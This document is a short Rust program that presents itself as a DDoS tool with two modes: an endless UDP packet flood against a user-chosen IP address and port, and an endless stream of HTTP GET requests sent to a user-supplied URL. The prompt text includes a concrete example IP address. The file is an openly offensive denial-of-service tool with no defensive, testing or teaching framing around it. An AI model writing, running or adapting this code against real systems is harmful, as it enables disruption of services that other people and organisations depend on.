use std::io::{self, Write};
use std::net::{UdpSocket, SocketAddr, TcpStream};
use std::thread;
use std::time::Duration;


fn main() -> std::io::Result<()> {
    println!("Choose a DDOS mode:");
    println!("1. Udp");
    println!("2. HTTP GET spam");


let mut mode_input = String::new();
io::stdin().read_line(&mut mode_input)?;
let mode = mode_input.trim().parse::<u32>().unwrap();

match mode {
    1 => {
        let socket = UdpSocket::bind("0.0.0.0:0")?;

        println!("Enter destination IP address:");
        let mut dest_ip = String::new();
        io::stdin().read_line(&mut dest_ip)?;
        let dest_ip = dest_ip.trim();

        println!("enter destination port:");
        let mut dest_port = String::new();
        io::stdin().read_line(&mut dest_port)?;
        let dest_port = dest_port.trim().parse::<u16>().unwrap();


        let dest_sockaddr: SocketAddr = format!("{}:{}", dest_ip, dest_port)
            .parse()
            .expect("Failed to parse address");

        println!("Enter UDP data:");
        let mut udp_data = String::new();
        io::stdin().read_line(&mut udp_data)?;
        let udp_data = udp_data.trim().as_bytes();

        loop {
            socket.send_to(udp_data, dest_sockaddr)?;
            thread::sleep(Duration::from_secs(0))
        }
    }
    2 => {
        println!("Enter URL (Should look like this: http://137.74.187.101:80) for HTTP GET spam:");
        let mut url = String::new();
        io::stdin().read_line(&mut url)?;
        let url = url.trim();

        let url_parts: Vec<&str> = url.split("/").collect();
        let host_port: Vec<&str> = url_parts[2].split(":").collect();
        let host = host_port[0];
        let port = host_port.get(1).unwrap_or(&"80");

        let mut stream = TcpStream::connect(format!("{}:{}", host, port))?;
        loop {
            let request = format!("GET {} HTTP/1.1\r\nHost: {}\r\n\r\n", url, host);
            stream.write(request.as_bytes())?;
            thread::sleep(Duration::from_secs(0));
        }
    }  

    _ => panic!("Invalid mode")
}
}